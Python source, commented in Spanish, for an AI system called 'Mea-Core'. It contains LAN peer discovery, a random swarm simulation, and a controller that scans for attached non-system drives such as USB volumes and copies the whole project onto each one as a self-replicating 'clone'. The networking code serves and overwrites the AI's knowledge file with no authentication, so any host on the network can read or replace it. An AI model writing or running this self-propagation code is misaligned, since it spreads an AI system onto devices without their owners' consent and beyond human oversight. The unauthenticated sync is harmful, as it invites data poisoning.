# --- Enjambre Real: Descubrimiento y Sincronización Ligera entre Nodos ---
import socket
import threading
import time

class SwarmNetworkNode:
    """
    Nodo de enjambre real: anuncia su presencia y sincroniza conocimiento con otros nodos en la LAN.
    """
    BROADCAST_PORT = 50505
    SYNC_PORT = 50506
    BROADCAST_INTERVAL = 5  # segundos
    TIMEOUT = 15  # segundos para considerar un nodo inactivo

    def __init__(self, node_id, knowledge_path):
        self.node_id = node_id
        self.knowledge_path = knowledge_path  # Ej: 'config/responses.json'
        self.neighbors = {}  # node_id: (ip, last_seen)
        self.running = False
        self._lock = threading.Lock()

    def start(self):
        self.running = True
        threading.Thread(target=self._broadcast_presence, daemon=True).start()
        threading.Thread(target=self._listen_broadcasts, daemon=True).start()
        threading.Thread(target=self._listen_sync_requests, daemon=True).start()
        threading.Thread(target=self._prune_neighbors, daemon=True).start()

    def stop(self):
        self.running = False

    def _broadcast_presence(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        msg = f"MEA-CORE-NODE:{self.node_id}"
        while self.running:
            s.sendto(msg.encode(), ("<broadcast>", self.BROADCAST_PORT))
            time.sleep(self.BROADCAST_INTERVAL)

    def _listen_broadcasts(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("", self.BROADCAST_PORT))
        while self.running:
            try:
                data, addr = s.recvfrom(1024)
                msg = data.decode()
                if msg.startswith("MEA-CORE-NODE:"):
                    node_id = msg.split(":",1)[1]
                    if node_id != self.node_id:
                        with self._lock:
                            self.neighbors[node_id] = (addr[0], time.time())
            except Exception:
                continue

    def _listen_sync_requests(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("", self.SYNC_PORT))
        s.listen(5)
        while self.running:
            try:
                conn, addr = s.accept()
                threading.Thread(target=self._handle_sync, args=(conn,), daemon=True).start()
            except Exception:
                continue

    def _handle_sync(self, conn):
        try:
            with open(self.knowledge_path, "rb") as f:
                data = f.read()
            conn.sendall(data)
        except Exception:
            pass
        finally:
            conn.close()

    def _prune_neighbors(self):
        while self.running:
            now = time.time()
            with self._lock:
                to_remove = [nid for nid,(_,last) in self.neighbors.items() if now-last > self.TIMEOUT]
                for nid in to_remove:
                    del self.neighbors[nid]
            time.sleep(5)

    def sync_with_neighbors(self):
        """Solicita el archivo de conocimiento a todos los vecinos y lo fusiona (simplemente reemplaza si es más reciente)."""
        for node_id, (ip, _) in list(self.neighbors.items()):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((ip, self.SYNC_PORT))
                data = b""
                while True:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                s.close()
                # Guardar si es diferente (puedes mejorar con timestamps/versiones)
                with open(self.knowledge_path, "rb") as f:
                    local = f.read()
                if data and data != local:
                    with open(self.knowledge_path, "wb") as f:
                        f.write(data)
                    print(f"[SwarmNetwork] Sincronizado conocimiento desde {node_id} ({ip})")
            except Exception:
                continue
# --- Simulación de Enjambre Virtual (Inspirado en el simulador HTML) ---
import random

class SwarmNode:
    """
    Nodo virtual del enjambre, simula un agente MEA-Core en la red.
    """
    def __init__(self, node_id, lan_device, priority=1, bandwidth=None):
        self.id = node_id
        self.lan_device = lan_device
        self.priority = priority
        self.status = 'activo'  # 'activo', 'replicando', 'offline'
        self.cpu = random.randint(10, 60)
        self.memory = random.randint(20, 70)
        self.bandwidth = bandwidth if bandwidth else random.uniform(50, 150)  # Mbps
        self.children = []
        self.data = []
        self.network_load = 0.0
        self.fail_chance = 0.005

    def __repr__(self):
        return f"<SwarmNode {self.id} ({self.lan_device}) {self.status}>"

class SwarmNetwork:
    """
    Red virtual de enjambre, gestiona nodos, replicación, fallos y reconexión.
    """
    LAN_DEVICES = ['Servidor','PC','Laptop','Tablet','RaspberryPi','NAS','Router','IoT']

    def __init__(self, node_count=15):
        self.nodes = []
        self.replication_history = []
        self.alerts = []
        self._create_nodes(node_count)
        self._build_topology()

    def _create_nodes(self, node_count):
        for i in range(node_count):
            dev = random.choice(self.LAN_DEVICES)
            priority = {'Servidor':5,'PC':4,'Laptop':3,'NAS':4,'Router':2}.get(dev,1)
            node = SwarmNode(f"Nodo-{i+1}", dev, priority)
            self.nodes.append(node)

    def _build_topology(self):
        hubs = [n for n in self.nodes if n.priority >= 4]
        for n in self.nodes:
            if n not in hubs:
                hub = random.choice(hubs)
                hub.children.append(n)

    def replicate(self, node1, node2):
        if node1.status == 'replicando' or node2.status == 'replicando':
            return
        # Pérdida de paquetes
        if random.random() < 0.05:
            self.alerts.append(f"Paquete perdido entre {node1.id} y {node2.id}")
            return
        # Latencia y saturación
        avg_bw = (node1.bandwidth + node2.bandwidth) / 2
        network_factor = 1 + min(node1.network_load,1) + min(node2.network_load,1)
        latency = max(100, (5000/avg_bw) * network_factor)
        node1.status = node2.status = 'replicando'
        node1.network_load += 0.3
        node2.network_load += 0.3
        is_critical = random.random() < (max(node1.priority, node2.priority)/5)
        new_data = f"{'CRITICAL' if is_critical else 'Data'}-{random.randint(0,999)}"
        node1.data.append(new_data)
        node2.data.append(new_data)
        node1.data = node1.data[-20:]
        node2.data = node2.data[-20:]
        self.replication_history.append(f"{node1.id}<->{node2.id} intercambiaron {new_data} (lat {int(latency)}ms)")
        # Simular fin de replicación
        def finish():
            node1.status = node2.status = 'activo'
            node1.cpu += random.uniform(0,5)
            node2.cpu += random.uniform(0,5)
            node1.memory += random.uniform(0,5)
            node2.memory += random.uniform(0,5)
            node1.network_load = max(0, node1.network_load-0.3)
            node2.network_load = max(0, node2.network_load-0.3)
        # En entorno real usarías threading/timers, aquí solo lógica directa
        finish()

    def step(self, replication_speed=0.03, connection_radius=150):
        # Simula un paso de la red: movimiento, fallos, replicación, reconexión
        for node in self.nodes:
            # Fallo aleatorio
            if random.random() < node.fail_chance:
                node.status = 'offline'
            # Reconexión automática
            if node.status == 'offline' and random.random() < 0.02:
                node.status = 'activo'
        # Replicación entre hubs y sus hijos
        for hub in [n for n in self.nodes if n.children]:
            for child in hub.children:
                if random.random() < replication_speed and hub.network_load<1 and child.network_load<1 and hub.status=='activo' and child.status=='activo':
                    self.replicate(hub, child)
        # Replicación mesh (todos con todos dentro de radio)
        for i, n1 in enumerate(self.nodes):
            for n2 in self.nodes[i+1:]:
                if n1.status=='activo' and n2.status=='activo' and n1.network_load<1 and n2.network_load<1:
                    if random.random() < replication_speed/2:
                        self.replicate(n1, n2)

    def get_status(self):
        # Devuelve un resumen del enjambre para mostrar en GUI/log
        return [{
            'id': n.id,
            'lan_device': n.lan_device,
            'status': n.status,
            'cpu': int(n.cpu),
            'memory': int(n.memory),
            'data_count': len(n.data),
            'bandwidth': int(n.bandwidth),
            'network_load': round(n.network_load,2),
            'priority': n.priority,
            'children': len(n.children)
        } for n in self.nodes]

    def get_replication_history(self, limit=20):
        return self.replication_history[-limit:][::-1]

    def get_alerts(self, limit=10):
        return self.alerts[-limit:][::-1]
import os
import shutil
import uuid
import json
import time
from typing import List, Dict, Any

# Asumimos que la versión "ligera" de Mea-Core está en el directorio actual.
# En una implementación real, esto podría ser un subdirectorio o un paquete específico.
SOURCE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

class SwarmController:
    """
    Gestiona la replicación, detección y comunicación del enjambre Mea-Core.
    """
    def __init__(self, settings: Dict[str, Any], memory):
        self.config = settings.get("swarm", {})
        self.replication_enabled = self.config.get("replication_enabled", False)
        self.scan_interval = self.config.get("scan_interval_seconds", 60)
        self.last_scan_time = 0
        self.memory = memory

    def _get_potential_devices(self) -> List[str]:
        """Busca dispositivos externos (ej. unidades USB en Windows). Lógica simple."""
        # Esta es una simulación. En un sistema real, esto sería más complejo
        # y adaptado para cada SO (ej. /media/ para Linux, /Volumes/ para macOS).
        potential_drives = []
        if os.name == 'nt': # Para Windows
            import string
            available_drives = [f'{d}:\\' for d in string.ascii_uppercase if os.path.exists(f'{d}:\\')]
            # Excluir la unidad del sistema
            system_drive = os.environ.get("SystemDrive", "C:").upper()
            potential_drives = [d for d in available_drives if d.upper() != f"{system_drive}\\"]
        # Aquí se añadiría la lógica para Linux y macOS
        return potential_drives

    def _generate_identity(self, parent_id: str) -> Dict[str, Any]:
        """Genera una identidad única para un nuevo clon."""
        return {
            "id": str(uuid.uuid4()),
            "parent_id": parent_id,
            "created_at": time.time(),
            "version": "1.0.0" # Podría obtenerse del código fuente
        }

    def replicate_to_device(self, device_path: str):
        """Clona el sistema Mea-Core a un nuevo dispositivo."""
        target_dir = os.path.join(device_path, "Mea-Core_Clone")
        print(f"[Swarm] Detectado dispositivo potencial en {device_path}. Intentando replicar en {target_dir}...")

        try:
            # Evitar replicar dentro de un clon existente o del propio proyecto
            if os.path.exists(os.path.join(target_dir, "mea_identity.json")) or os.path.samefile(SOURCE_DIR, target_dir):
                print(f"[Swarm] El directorio de destino ya es una instancia de Mea-Core. Replicación cancelada.")
                return

            # Copiar todo el directorio del proyecto
            shutil.copytree(SOURCE_DIR, target_dir, ignore=shutil.ignore_patterns('*.pyc', '__pycache__', '.git*', 'Otras IA'))

            # Crear el archivo de identidad del clon
            parent_id = self.memory.get_instance_id() # Necesitaremos un ID para la instancia actual
            identity = self._generate_identity(parent_id)
            with open(os.path.join(target_dir, "mea_identity.json"), "w") as f:
                json.dump(identity, f, indent=2)

            # Registrar la creación del clon en la memoria del padre
            self.memory.log_replication(identity['id'], target_dir)
            print(f"[Swarm] ¡Éxito! Mea-Core replicado en {target_dir} con ID: {identity['id']}")

        except FileExistsError:
            print(f"[Swarm] El directorio {target_dir} ya existe. Replicación cancelada.")
        except Exception as e:
            print(f"[Swarm] Error durante la replicación a {device_path}: {e}")

    def run_replication_cycle(self):
        """Ciclo principal que busca dispositivos y se replica si está activado."""
        if not self.replication_enabled:
            return
        
        # No escanear en cada ciclo de la IA, solo cada cierto intervalo
        if time.time() - self.last_scan_time < self.scan_interval:
            return

        print("[Swarm] Buscando nuevos dispositivos para expansión...")
        self.last_scan_time = time.time()
        devices = self._get_potential_devices()
        
        if not devices:
            print("[Swarm] No se encontraron nuevos dispositivos.")
            return

        for device in devices:
            self.replicate_to_device(device)